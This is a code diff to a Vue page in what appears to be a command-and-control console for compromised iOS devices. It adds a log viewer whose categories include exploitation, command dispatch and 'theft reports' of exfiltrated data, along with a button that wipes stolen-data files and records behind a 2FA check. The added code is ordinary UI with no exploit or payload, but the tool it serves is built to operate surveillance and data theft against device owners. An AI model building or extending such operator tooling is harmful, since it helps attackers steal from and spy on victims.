@@ -130,6 +130,77 @@
           </el-descriptions-item>
         </el-descriptions>
       </div>
+
+      <div style="margin-top:16px;">
+        <!-- Toolbar -->
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;flex-wrap:wrap;gap:8px;">
+          <div>
+            <span class="page-title">设备访问日志</span>
+            <span v-if="logsSummary" style="margin-left:12px;font-size:12px;color:var(--el-text-color-secondary);font-family:'SF Mono','Fira Code',Consolas,monospace;">
+              HTTP {{ logsSummary.http || 0 }} · CMD {{ logsSummary.command || 0 }} · EXFL {{ logsSummary.exfil || 0 }}
+              · IOS <span style="color:#56b6c2;">{{ logsSummary.raw_log || 0 }}</span>
+              · <span style="color:#f38ba8;">ERR {{ logsSummary.errors || 0 }}</span>
+              · <span style="color:#f9e2af;">WARN {{ logsSummary.warnings || 0 }}</span>
+              · <span style="color:#a6e3a1;">OK {{ logsSummary.success || 0 }}</span>
+            </span>
+          </div>
+          <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;">
+            <el-select v-model="logsFilterType" size="small" style="width:130px;" placeholder="全部类型" clearable>
+              <el-option label="HTTP 请求" value="http" />
+              <el-option label="命令调度" value="command" />
+              <el-option label="窃取上报" value="exfil" />
+              <el-option label="设备生命周期" value="device" />
+              <el-option label="漏洞利用" value="exploit" />
+              <el-option label="iOS 日志" value="raw_log" />
+            </el-select>
+            <el-input v-model="logsKeyword" size="small" style="width:220px;" placeholder="搜索标题/详情/标签..." clearable>
+              <template #prefix><el-icon><Search /></el-icon></template>
+            </el-input>
+            <el-button size="small" :loading="logsLoading" @click="loadLogs">
+              <el-icon><Refresh /></el-icon><span>刷新</span>
+            </el-button>
+            <el-button size="small" type="primary" plain :disabled="!filteredLogs.length" @click="copyLogs">
+              <el-icon><CopyDocument /></el-icon><span>复制</span>
+            </el-button>
+            <el-button size="small" type="danger" plain :loading="logsClearing" @click="clearLogs">
+              <el-icon><Delete /></el-icon><span>清空</span>
+            </el-button>
+          </div>
+        </div>
+
+        <!-- Terminal window -->
+        <div class="term-window" v-loading="logsLoading">
+          <div class="term-titlebar">
+            <div class="term-traffic">
+              <span class="term-dot term-dot-red"></span>
+              <span class="term-dot term-dot-yellow"></span>
+              <span class="term-dot term-dot-green"></span>
+            </div>
+            <span class="term-title-text">logs — {{ uuid ? uuid.slice(0, 16) + '…' : '' }} — {{ filteredLogs.length }} lines</span>
+            <span v-if="logsSummary" class="term-title-count">{{ filteredLogs.length }}/{{ logsSummary.total || filteredLogs.length }}</span>
+          </div>
+          <div class="term-body">
+            <div v-if="!logsLoading && !logs.length" class="term-empty">
+              <span class="term-prompt">$</span> no logs yet — device will populate after first connection
+            </div>
+            <div v-else-if="!filteredLogs.length" class="term-empty">
+              <span class="term-prompt">$</span> no matching logs for current filter
+            </div>
+            <div
+              v-for="(ev, idx) in filteredLogs"
+              :key="(ev.time || '') + '-' + idx"
+              class="term-line"
+              :class="'term-lvl-' + (ev.level || 'info')"
+            >
+              <span class="term-ts">{{ formatLogTime(ev.time) }}</span>
+              <span class="term-tag" :class="'term-tag-' + (ev.type || 'log')">{{ termTag(ev.type) }}</span>
+              <span class="term-msg">{{ ev.title || ev.detail || '-' }}</span>
+              <span v-if="ev.status_code != null" class="term-sc" :class="ev.status_code >= 500 ? 'term-sc-err' : (ev.status_code >= 400 ? 'term-sc-warn' : 'term-sc-ok')">{{ ev.status_code }}</span>
+              <span v-if="ev.ip && ev.ip !== 'unknown'" class="term-ip">↳ {{ ev.ip }}</span>
+            </div>
+          </div>
+        </div>
+      </div>
     </div>
 
     <el-row :gutter="16">
@@ -344,7 +415,7 @@
 import { ref, computed, onMounted, defineComponent, h } from 'vue'
 import { useRoute, useRouter } from 'vue-router'
 import { ElMessage, ElMessageBox } from 'element-plus'
-import { ArrowLeft, Promotion, VideoPlay } from '@element-plus/icons-vue'
+import { ArrowLeft, Promotion, VideoPlay, Refresh, CopyDocument, Delete, Search, Clock } from '@element-plus/icons-vue'
 import axios from '../utils/axios'
 import { formatDate, formatRelative, require2FA } from '../utils/twofa'
 
@@ -363,11 +434,36 @@ const scriptsList = ref([])
 const selectedScriptId = ref(null)
 const scriptRunning = ref(false)
 
+const logs = ref([])
+const logsLoading = ref(false)
+const logsClearing = ref(false)
+const logsFilterType = ref('')
+const logsKeyword = ref('')
+const logsSummary = ref(null)
+
 const validPhotos = computed(() =>
   Array.isArray(tabsData.value?.photos)
     ? tabsData.value.photos.filter(p => p && (typeof p.id !== 'undefined'))
     : []
 )
+
+const filteredLogs = computed(() => {
+  let arr = Array.isArray(logs.value) ? logs.value : []
+  if (logsFilterType.value) {
+    arr = arr.filter(x => String(x.type || '').toLowerCase() === String(logsFilterType.value).toLowerCase())
+  }
+  const kw = String(logsKeyword.value || '').trim().toLowerCase()
+  if (kw) {
+    arr = arr.filter(x => {
+      const hay = [
+        x.title || '', x.detail || '', x.source || '', x.type || '',
+        ...(x.tags || []), x.ip || '', x.status_code != null ? String(x.status_code) : ''
+      ].join(' ').toLowerCase()
+      return hay.includes(kw)
+    })
+  }
+  return arr
+})
 
 const isDeviceOnline = computed(() => {
   const s = String(device.value?.status || '').toLowerCase()
@@ -681,6 +777,123 @@ async function loadTabs() {
   }
 }
 
+function formatLogTime(t) {
+  if (!t) return '-'
+  try {
+    const d = new Date(String(t).replace('Z', ''))
+    if (Number.isNaN(d.getTime())) return String(t)
+    const pad = (n) => String(n).padStart(2, '0')
+    return `${d.getFullYear()}-${pad(d.getMonth() + 1)}-${pad(d.getDate())} ${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}`
+  } catch (e) {
+    return String(t)
+  }
+}
+
+function termTag(t) {
+  const map = {
+    http: 'HTTP', command: 'CMD', exfil: 'EXFL', device: 'DEV',
+    exploit: 'EXPL', exploit_console: 'EXPL', raw_log: 'IOS', log: 'LOG'
+  }
+  return map[t] || (t || 'LOG').toString().toUpperCase().slice(0, 4)
+}
+
+async function loadLogs() {
+  logsLoading.value = true
+  try {
+    const res = await axios.get(`/api/devices/${uuid}/logs`, {
+      params: { limit: 300, skip: 0, tail_log: 300 }
+    })
+    logs.value = res.data?.items || res.data || []
+    logsSummary.value = res.data?.summary || null
+  } catch (err) {
+    const msg = err?.response?.data?.detail || err?.message || '日志加载失败'
+    ElMessage.error(msg)
+    logs.value = []
+    logsSummary.value = null
+  } finally {
+    logsLoading.value = false
+  }
+}
+
+async function copyLogs() {
+  const arr = Array.isArray(filteredLogs.value) && filteredLogs.value.length ? filteredLogs.value : (logs.value || [])
+  if (!arr.length) {
+    ElMessage.warning('没有可复制的日志')
+    return
+  }
+  const lines = []
+  lines.push(`# Device UUID: ${uuid}`)
+  lines.push(`# Exported at: ${new Date().toLocaleString()}`)
+  lines.push(`# Total entries: ${arr.length}`)
+  lines.push('')
+  for (const ev of arr) {
+    const parts = []
+    parts.push(`[${formatLogTime(ev.time)}]`)
+    parts.push(`[${(ev.level || 'info').toUpperCase()}]`)
+    parts.push(`[${ev.type || '-'}]`)
+    if (ev.ip) parts.push(`[IP ${ev.ip}]`)
+    if (ev.status_code != null) parts.push(`[HTTP ${ev.status_code}]`)
+    if (ev.source) parts.push(`(src=${ev.source})`)
+    parts.push(ev.title || '')
+    const head = parts.join(' ')
+    lines.push(head)
+    if (ev.detail) lines.push('  > ' + String(ev.detail).replace(/\n/g, '\n  > '))
+    if (Array.isArray(ev.tags) && ev.tags.length) lines.push('  tags: ' + ev.tags.join(', '))
+    lines.push('')
+  }
+  const text = lines.join('\n')
+  try {
+    if (navigator && navigator.clipboard && typeof navigator.clipboard.writeText === 'function') {
+      await navigator.clipboard.writeText(text)
+    } else {
+      const ta = document.createElement('textarea')
+      ta.value = text
+      ta.style.position = 'fixed'
+      ta.style.left = '-9999px'
+      document.body.appendChild(ta)
+      ta.select()
+      try {
+        document.execCommand('copy')
+      } finally {
+        document.body.removeChild(ta)
+      }
+    }
+    ElMessage.success(`已复制 ${arr.length} 条日志到剪贴板`)
+  } catch (e) {
+    ElMessage.error('复制失败：' + (e?.message || '未知错误'))
+  }
+}
+
+async function clearLogs() {
+  try {
+    await ElMessageBox.confirm(
+      `将清空 UUID=${uuid} 的访问日志（HTTP 请求记录、命令历史、窃取数据文件/记录）。\n\n此操作不可恢复，确定继续吗？`,
+      '清空设备日志确认',
+      { confirmButtonText: '确定清空', cancelButtonText: '取消', type: 'warning', distinguishCancelAndClose: true }
+    )
+  } catch (e) {
+    return
+  }
+  logsClearing.value = true
+  try {
+    const otp = await require2FA('clear device logs')
+    const params = {}
+    if (otp) params.otp_code = otp
+    const res = await axios.delete(`/api/devices/${uuid}/logs`, { params })
+    const d = res.data?.deleted || {}
+    ElMessage.success(`已清空：日志 ${d.logs || 0} · 命令 ${d.commands || 0} · 窃取记录 ${d.exfil || 0} · 文件 ${d.files || 0}`)
+    logs.value = []
+    logsSummary.value = null
+    loadTabs()
+  } catch (err) {
+    if (err === 'cancel' || err === 'close') return
+    const msg = err?.response?.data?.detail || err?.message || '清空失败'
+    ElMessage.error(msg)
+  } finally {
+    logsClearing.value = false
+  }
+}
+
 function onTemplateClick(cmd) {
   if (commandsDisabled.value) {
     ElMessage.warning(commandBlockReason.value || '当前设备不兼容，命令下发已禁止')
@@ -820,5 +1033,130 @@ onMounted(() => {
   loadDevice()
   loadHeartbeats()
   loadTabs()
+  loadLogs()
 })
 </script>
+
+<style scoped>
+/* ===== Terminal-style log panel ===== */
+.term-window {
+  background: #1e1e2e;
+  border-radius: 8px;
+  overflow: hidden;
+  border: 1px solid #313244;
+  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.12);
+}
+.term-titlebar {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  padding: 7px 14px;
+  background: #181825;
+  border-bottom: 1px solid #313244;
+}
+.term-traffic { display: flex; gap: 6px; flex-shrink: 0; }
+.term-dot { width: 11px; height: 11px; border-radius: 50%; }
+.term-dot-red    { background: #f38ba8; }
+.term-dot-yellow { background: #f9e2af; }
+.term-dot-green  { background: #a6e3a1; }
+.term-title-text {
+  font-family: 'SF Mono', 'Fira Code', 'Cascadia Code', Consolas, monospace;
+  font-size: 12px;
+  color: #6c7086;
+  flex: 1;
+  user-select: none;
+}
+.term-title-count {
+  font-family: 'SF Mono', Consolas, monospace;
+  font-size: 11px;
+  color: #585b70;
+  flex-shrink: 0;
+}
+.term-body {
+  max-height: 480px;
+  overflow-y: auto;
+  padding: 6px 0;
+  font-family: 'SF Mono', 'Fira Code', 'Cascadia Code', Consolas, 'Courier New', monospace;
+  font-size: 12.5px;
+  line-height: 1.65;
+}
+.term-body::-webkit-scrollbar { width: 8px; }
+.term-body::-webkit-scrollbar-track { background: #1e1e2e; }
+.term-body::-webkit-scrollbar-thumb { background: #45475a; border-radius: 4px; }
+.term-body::-webkit-scrollbar-thumb:hover { background: #585b70; }
+
+.term-empty {
+  padding: 28px 16px;
+  color: #6c7086;
+  font-family: 'SF Mono', Consolas, monospace;
+  font-size: 13px;
+}
+.term-prompt { color: #f9e2af; margin-right: 6px; }
+
+.term-line {
+  display: flex;
+  align-items: baseline;
+  gap: 7px;
+  padding: 0 14px;
+  transition: background-color .1s ease;
+}
+.term-line:hover { background: rgba(205, 214, 244, 0.04); }
+
+.term-ts {
+  color: #585b70;
+  font-size: 11px;
+  flex-shrink: 0;
+  white-space: nowrap;
+  user-select: none;
+}
+.term-tag {
+  flex-shrink: 0;
+  font-size: 10px;
+  font-weight: 700;
+  padding: 1px 5px;
+  border-radius: 3px;
+  white-space: nowrap;
+  text-transform: uppercase;
+  letter-spacing: 0.3px;
+}
+.term-msg {
+  color: #cdd6f4;
+  word-break: break-all;
+  min-width: 0;
+  flex: 1;
+  white-space: pre-wrap;
+}
+.term-sc {
+  font-size: 11px;
+  font-weight: 700;
+  flex-shrink: 0;
+}
+.term-sc-ok   { color: #a6e3a1; }
+.term-sc-warn { color: #f9e2af; }
+.term-sc-err  { color: #f38ba8; }
+.term-ip {
+  color: #585b70;
+  font-size: 11px;
+  flex-shrink: 0;
+  white-space: nowrap;
+}
+
+/* Log level → message color */
+.term-lvl-info    .term-msg { color: #cdd6f4; }
+.term-lvl-log     .term-msg { color: #cdd6f4; }
+.term-lvl-success .term-msg { color: #a6e3a1; }
+.term-lvl-warn    .term-msg { color: #f9e2af; }
+.term-lvl-error   .term-msg { color: #f38ba8; }
+.term-lvl-fatal   .term-msg { color: #f38ba8; font-weight: 700; }
+.term-lvl-debug   .term-msg { color: #89dceb; }
+
+/* Type tag → bg/text color */
+.term-tag-http              { background: #313244; color: #89b4fa; }
+.term-tag-command           { background: #313244; color: #f9e2af; }
+.term-tag-exfil             { background: #313244; color: #f5c2e7; }
+.term-tag-device            { background: #313244; color: #a6e3a1; }
+.term-tag-exploit           { background: #313244; color: #fab387; }
+.term-tag-exploit_console  { background: #313244; color: #fab387; }
+.term-tag-raw_log          { background: #313244; color: #56b6c2; }
+.term-tag-log              { background: #313244; color: #6c7086; }
+</style>
